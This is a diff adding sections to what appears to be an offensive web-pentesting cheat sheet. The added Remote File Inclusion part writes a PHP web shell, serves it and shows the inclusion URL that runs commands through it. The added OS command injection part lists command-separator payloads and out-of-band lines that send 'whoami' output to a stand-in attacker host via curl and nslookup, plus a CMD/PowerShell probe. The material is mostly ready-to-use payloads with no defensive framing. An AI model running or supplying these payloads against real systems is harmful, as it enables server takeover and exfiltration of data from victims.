@@ -770,11 +770,19 @@ python3 lfimap.py -U "http://IP/vuln.php?param=PWN" -C "PHPSESSID=XXXXXXXX" -a
 ```
 https://github.com/hansmach1ne/lfimap  
 
+## Remote File Inclusion (RFI)
+```
+echo "<?php echo shell_exec($_GET['cmd']); ?>" > evil.txt
+python -m http.server 80
+```
+```
+http://site.com/menu.php?file=http://<IP>/evil.txt&cmd=ipconfig
+```
+	
 ## Path Normalization
 https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf
 
 ## Unrestricted File Upload Bypasss
-
 ### Extension Bypass via metadata  
 1.  
 ```
@@ -1780,6 +1788,32 @@ https://github.com/rodolfomarianocy/hackshell
 "__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('id')";
 ```
 	
+### OS Command Injection
+-> Special Characters
+```
+& command
+&& command
+; command
+command %0A command
+| command
+|| command
+`command`
+$(command)
+```
+-> -> Out Of Band - OOB Exploitation
+
+```
+curl http://$(whoami).site.com/
+curl http://`whoami`.site.com/
+nslookup `whoami`.attacker-server.com &
+curl http://192.168.0.20/$(whoami)
+```
+
+-> Check if the commands are executed by PowerShell or CMD.
+
+```
+(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell 
+```
 ### Shellshock
 -> Detection
 ```
